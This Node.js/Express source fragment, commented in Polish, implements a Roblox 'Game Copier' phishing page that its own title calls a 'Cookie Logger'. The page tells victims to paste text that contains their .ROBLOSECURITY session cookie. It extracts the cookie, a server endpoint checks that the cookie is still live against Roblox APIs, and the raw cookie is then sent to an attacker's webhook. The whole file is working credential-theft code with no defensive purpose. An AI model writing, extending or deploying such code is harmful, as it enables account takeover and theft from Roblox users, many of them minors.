// ────────────────────────────────────────────────
// Game Copier – strona (wygląd prawie identyczny jak checker)
// ────────────────────────────────────────────────
app.get('/gamecopier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Game Copier - Cookie Logger</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin: 0; padding: 30px; }
    .container { max-width: 780px; margin: 0 auto; }
    h1 { color: #8b5cf6; text-align: center; }
    textarea { 
      width: 100%; min-height: 260px; 
      background: #1a1a2e; color: #d0d0ff; 
      border: 1px solid #334; border-radius: 8px; 
      padding: 16px; font-family: Consolas, monospace; 
      font-size: 15px; resize: vertical; margin: 20px 0; 
    }
    button { 
      background: #8b5cf6; color: white; border: none; 
      padding: 16px 48px; font-size: 18px; border-radius: 8px; 
      cursor: pointer; display: block; margin: 0 auto 30px; 
    }
    button:hover { background: #7c3aed; }
    #result { 
      background: #1a1a2e; border: 1px solid #334; 
      border-radius: 8px; padding: 24px; min-height: 120px; 
      text-align: center; font-size: 17px; line-height: 1.6;
    }
    .error   { color: #ff6b6b; font-weight: bold; }
    .success { color: #4ade80; font-weight: bold; }
    .loading { color: #fbbf24; font-style: italic; }
    .back { margin-top: 40px; color: #888; font-size: 14px; }
    .back a { color: #6ab0ff; text-decoration: none; }
  </style>
</head>
<body>
<div class="container">
  <h1>Game Copier</h1>
  <p>Wklej dowolny tekst (log, konsola, headers, JSON, skrypt itp.)<br>
  Cookie zostanie automatycznie wykryte i wysłane.</p>
  
  <textarea id="input" placeholder="Wklej tutaj tekst..."></textarea>
  <button onclick="check()">Wyślij cookie</button>
  
  <div id="result"></div>
  
  <div class="back"><a href="/">← Powrót do strony głównej</a></div>
</div>

<script>
async function check() {
  const raw = document.getElementById('input').value.trim();
  const result = document.getElementById('result');
  result.innerHTML = '';

  if (!raw) {
    result.innerHTML = '<span class="error">Nic nie wklejono</span>';
    return;
  }

  let cookie = null;
  let match;

  // 1. Najczęściej spotykany format w devtools / JSON
  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
  if (match) cookie = match[1].trim();

  // 2. Pełny warning string
  if (!cookie) {
    match = raw.match(/_\\|WARNING[^"]{200,}/);
    if (match) cookie = match[0].trim();
  }

  // 3. Fallback – najdłuższy ciąg zaczynający się od _
  if (!cookie) {
    const fallbacks = raw.match(/_[\\w\\-|]{180,}/g) || [];
    if (fallbacks.length) {
      cookie = fallbacks.reduce((a, b) => a.length > b.length ? a : b).trim();
    }
  }

  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY</span>';
    return;
  }

  result.innerHTML = '<span class="loading">Cookie znaleziony – wysyłanie...</span>';

  try {
    const res = await fetch('/check-game', {   // ← zmieniony endpoint
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, source: 'gamecopier' })  // możesz dodać source jeśli chcesz rozróżniać w webhooku
    });

    const json = await res.json();

    if (json.error) {
      result.innerHTML = '<span class="error">Błąd: ' + json.error + '</span>';
    } else {
      result.innerHTML = '<span class="success">Cookie wysłane pomyślnie</span>';
    }
  } catch (err) {
    result.innerHTML = '<span class="error">Błąd: ' + err.message + '</span>';
  }
}
</script>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Nowy endpoint – prawie identyczny jak /check, możesz nawet zostawić ten sam kod
// ────────────────────────────────────────────────
app.post('/check-game', async (req, res) => {
  const { cookie, source = 'gamecopier' } = req.body || {};

  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Brak lub niepoprawny cookie' });
  }

  try {
    // CSRF token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json',
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Brak X-CSRF-Token');

    // Sprawdzenie czy cookie żyje
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
      },
    });

    if (!userRes.ok) throw new Error('Cookie nie jest ważne');

    const userData = await userRes.json();

    // ────────────────────────────────────────────────
    // Tutaj wklej CAŁĄ swoją dotychczasową logikę pobierania danych:
    // robux, premium, headless, korblox, mm2Count, rap, gamepassy itd.
    // (kopiuj z oryginalnego /check)
    // ────────────────────────────────────────────────
    // ... (wstaw tutaj cały blok z await fetch do różnych endpointów Roblox)

    // Przykładowo – gotowy obiekt result (uzupełnij swoimi zmiennymi)
    const result = {
      username: userData.name,
      userId: userData.id,
      // hasPremium, robux, rap, hasHeadless, hasKorblox, mm2Count, ... itd.
      // wszystko co zbierasz
      cookie: cookie,           // na webhooka
      source: source,           // opcjonalnie – skąd przyszło
      capturedAt: new Date().toISOString()
    };

    // Wysyłka na webhook – dokładnie tak jak miałeś wcześniej
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            // Twój embed / embeds – wklej tutaj swoją dotychczasową strukturę
            // możesz dodać pole "Źródło: GameCopier" albo zmienić kolor itp.
            embeds: [
              {
                title: `GameCopier Capture • ${userData.name}`,
                color: 0x8b5cf6,   // fioletowy np.
                description: `**Cookie z GameCopier**\n\`\`\`\n${cookie}\n\`\`\``,
                fields: [
                  // Twoje pola: robux, rap, mm2 itd.
                ],
                timestamp: new Date().toISOString()
              }
            ]
          })
        });
      } catch (e) {
        console.error("Webhook error:", e);
      }
    }

    res.json({ success: true });

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Błąd serwera' });
  }
});
